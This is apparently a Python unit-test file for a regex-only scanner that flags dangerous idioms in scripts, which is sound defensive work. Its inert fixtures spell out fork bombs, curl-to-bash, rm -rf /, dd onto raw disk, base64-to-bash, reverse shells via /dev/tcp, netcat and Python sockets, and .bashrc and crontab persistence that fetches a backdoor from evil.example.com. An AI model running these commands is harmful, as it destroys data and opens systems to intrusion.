"""Unit tests for checks/script_patterns.py -- static regex-only dangerous-idiom detection.

Fixtures are real (but inert) strings written to tmp_path; nothing here is
ever executed, only pattern-matched, matching the module's own hard rule.
"""

from __future__ import annotations

from pathlib import Path

from app.modules.x402_scan.sandbox.checks import script_patterns


def test_non_script_file_is_not_scanned(tmp_path: Path) -> None:
    """A plain non-script text file is a deliberate skip, not a silent no-op."""
    p = tmp_path / "notes.txt"
    p.write_text("just some plain benign notes, nothing here")
    result = script_patterns.run(str(p))
    assert result == {"scanned": False, "reason": "not a script/shebang"}
    assert "risk_score" not in result


def test_benign_shell_script_has_no_risk_score(tmp_path: Path) -> None:
    """A normal, harmless shell script is scanned but carries no risk_score/caution_notes."""
    p = tmp_path / "hello.sh"
    p.write_text("#!/bin/bash\necho 'hello world'\nls -la /tmp\n")
    result = script_patterns.run(str(p))
    assert result["scanned"] is True
    assert result["detected_as"] == "file extension '.sh'"
    assert "risk_score" not in result
    assert "caution_notes" not in result


def test_shebang_alone_triggers_scan_without_script_extension(tmp_path: Path) -> None:
    """A file with no script extension but a `#!` first line is still scanned."""
    p = tmp_path / "weird_name"
    p.write_text("#!/usr/bin/env python3\nprint('hi')\n")
    result = script_patterns.run(str(p))
    assert result["scanned"] is True
    assert result["detected_as"] == "shebang line"


def test_fork_bomb_is_detected(tmp_path: Path) -> None:
    """The classic bash fork bomb is caught and scores at the top of the range."""
    p = tmp_path / "bomb.sh"
    p.write_text("#!/bin/sh\n:(){ :|:& };:\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_FORK_BOMB
    assert any("fork bomb" in note for note in result["caution_notes"])


def test_fork_bomb_close_variant_with_named_function_is_detected(tmp_path: Path) -> None:
    """A renamed-function fork bomb (not the literal `:` symbol) still matches via backreference."""
    p = tmp_path / "bomb2.sh"
    p.write_text("#!/bin/bash\nbomb(){ bomb|bomb& };bomb\n")
    result = script_patterns.run(str(p))
    assert any("fork bomb" in note for note in result["caution_notes"])


def test_curl_pipe_bash_is_detected(tmp_path: Path) -> None:
    """A remote-pipe-execute idiom (curl | bash) is flagged."""
    p = tmp_path / "install.sh"
    p.write_text("#!/bin/bash\ncurl -fsSL https://example.com/install.sh | bash\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_REMOTE_PIPE_EXEC
    assert any("remote-pipe-execute" in note for note in result["caution_notes"])


def test_wget_pipe_sh_is_detected(tmp_path: Path) -> None:
    """The wget -O- variant of remote-pipe-execute is also flagged."""
    p = tmp_path / "install2.sh"
    p.write_text("#!/bin/sh\nwget -qO- https://example.com/x | sh\n")
    result = script_patterns.run(str(p))
    assert any("remote-pipe-execute" in note for note in result["caution_notes"])


def test_rm_rf_root_is_detected(tmp_path: Path) -> None:
    """`rm -rf /` is flagged as a destructive filesystem op."""
    p = tmp_path / "wipe.sh"
    p.write_text("#!/bin/bash\necho starting\nrm -rf /\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_DESTRUCTIVE_FS
    assert any("destructive rm" in note for note in result["caution_notes"])


def test_rm_rf_star_is_detected(tmp_path: Path) -> None:
    """`rm -rf /*` is also flagged."""
    p = tmp_path / "wipe2.sh"
    p.write_text("#!/bin/bash\nrm -rf /*\n")
    result = script_patterns.run(str(p))
    assert any("destructive rm" in note for note in result["caution_notes"])


def test_rm_rf_of_a_normal_directory_is_not_flagged(tmp_path: Path) -> None:
    """`rm -rf` against an ordinary path is common and must not be flagged."""
    p = tmp_path / "cleanup.sh"
    p.write_text("#!/bin/bash\nrm -rf /tmp/build-artifacts\n")
    result = script_patterns.run(str(p))
    assert "risk_score" not in result


def test_dd_onto_raw_disk_is_detected(tmp_path: Path) -> None:
    """`dd ... of=/dev/sdX` is flagged as a destructive filesystem op."""
    p = tmp_path / "dd.sh"
    p.write_text("#!/bin/bash\ndd if=/dev/zero of=/dev/sda bs=1M\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_DESTRUCTIVE_FS


def test_base64_decode_pipe_bash_is_detected(tmp_path: Path) -> None:
    """An obfuscated base64-decode-then-exec chain is flagged."""
    p = tmp_path / "obf.sh"
    p.write_text("#!/bin/bash\necho cGF5bG9hZA== | base64 -d | bash\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_BASE64_EXEC
    assert any("base64-decode" in note for note in result["caution_notes"])


def test_bash_dev_tcp_reverse_shell_is_detected(tmp_path: Path) -> None:
    """The classic bash /dev/tcp reverse shell one-liner is flagged."""
    p = tmp_path / "rev.sh"
    p.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_REVERSE_SHELL
    assert any("reverse shell" in note for note in result["caution_notes"])


def test_nc_e_reverse_shell_is_detected(tmp_path: Path) -> None:
    """`nc -e /bin/sh HOST PORT` is flagged as a reverse shell."""
    p = tmp_path / "nc.sh"
    p.write_text("#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n")
    result = script_patterns.run(str(p))
    assert any("netcat" in note for note in result["caution_notes"])


def test_python_reverse_shell_idiom_is_detected(tmp_path: Path) -> None:
    """A classic python socket/connect/subprocess reverse-shell one-liner is flagged."""
    p = tmp_path / "rev.py"
    p.write_text(
        "#!/usr/bin/env python3\n"
        "import socket,subprocess,os\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        's.connect(("10.0.0.1",4444))\n'
        'subprocess.call(["/bin/sh","-i"])\n'
    )
    result = script_patterns.run(str(p))
    assert any("python socket/connect" in note for note in result["caution_notes"])


def test_bashrc_append_with_payload_is_detected(tmp_path: Path) -> None:
    """A .bashrc append paired with a payload-shaped command is flagged as persistence.

    Uses a `wget` reference with no pipe-to-shell so this exercises only the
    persistence pattern in isolation, not also the (higher-scored)
    remote-pipe-execute pattern.
    """
    p = tmp_path / "persist.sh"
    p.write_text(
        "#!/bin/bash\necho 'wget http://evil.example.com/backdoor.sh -O /tmp/x' >> ~/.bashrc\n"
    )
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_PERSISTENCE
    assert any(".bashrc" in note for note in result["caution_notes"])


def test_bashrc_append_without_payload_is_not_flagged(tmp_path: Path) -> None:
    """An ordinary, harmless .bashrc append (common in setup scripts) is not flagged."""
    p = tmp_path / "setup.sh"
    p.write_text("#!/bin/bash\necho 'export PATH=$PATH:/opt/tool/bin' >> ~/.bashrc\n")
    result = script_patterns.run(str(p))
    assert "risk_score" not in result


def test_crontab_stdin_install_is_detected(tmp_path: Path) -> None:
    """Piping a crafted crontab into `crontab -` is flagged as persistence."""
    p = tmp_path / "cron.sh"
    p.write_text("#!/bin/bash\necho '* * * * * /tmp/x' | crontab -\n")
    result = script_patterns.run(str(p))
    assert result["risk_score"] == script_patterns.RISK_PERSISTENCE


def test_fork_bomb_scores_at_least_as_high_as_persistence() -> None:
    """High-confidence idioms (fork bomb, reverse shell) must outrank the low-confidence persistence category."""
    assert script_patterns.RISK_FORK_BOMB >= script_patterns.RISK_PERSISTENCE
    assert script_patterns.RISK_REVERSE_SHELL >= script_patterns.RISK_PERSISTENCE


def test_binary_content_with_script_extension_does_not_misfire(tmp_path: Path) -> None:
    """Random binary bytes (not resembling text lines) must not trigger a pattern by coincidence."""
    p = tmp_path / "weird.sh"
    # Enough high-byte noise that any accidental substring match would land on
    # a line failing the printable-ratio guard.
    p.write_bytes(bytes(range(256)) * 20)
    result = script_patterns.run(str(p))
    assert result["scanned"] is True
    assert "risk_score" not in result


def test_a_worst_case_shape_still_returns_promptly(tmp_path: Path) -> None:
    """A large, pattern-adjacent-but-benign script does not pathologically blow up regex matching."""
    p = tmp_path / "big.sh"
    lines = ["#!/bin/bash"] + [f"echo 'line {i}: nothing suspicious here'" for i in range(20000)]
    p.write_text("\n".join(lines))
    result = script_patterns.run(str(p))
    assert result["scanned"] is True
    assert "risk_score" not in result
